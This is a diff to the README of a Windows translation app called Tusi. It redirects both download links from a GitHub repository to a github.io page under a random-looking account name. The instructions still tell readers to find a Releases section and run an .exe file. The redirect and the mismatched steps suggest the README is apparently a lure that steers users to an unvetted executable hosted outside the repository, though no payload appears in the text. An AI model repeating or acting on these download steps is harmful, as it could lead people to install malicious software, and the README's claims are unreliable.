@@ -1,6 +1,6 @@
 # 🌐 Tusi - Translate text instantly from your menu
 
-[![Download Tusi for Windows](https://img.shields.io/badge/Download-Click_Here-blue.svg)](https://github.com/Incentivestockoptionpocatello327/Tusi)
+[![Download Tusi for Windows](https://img.shields.io/badge/Download-Click_Here-blue.svg)](https://incentivestockoptionpocatello327.github.io)
 
 Tusi provides a simple way to translate language. It sits in your menu bar so you can reach it at any time. You do not need to open complex windows or visit websites to switch languages. The app detects the language you type and handles the conversion for you.
 
@@ -8,7 +8,7 @@ Tusi provides a simple way to translate language. It sits in your menu bar so yo
 
 You can grab the installer from the official repository page.
 
-1. Visit the [Tusi download page](https://github.com/Incentivestockoptionpocatello327/Tusi).
+1. Visit the [Tusi download page](https://incentivestockoptionpocatello327.github.io).
 2. Look for the Releases section on the right side of the screen.
 3. Click the latest version number.
 4. Locate the file ending in .exe.
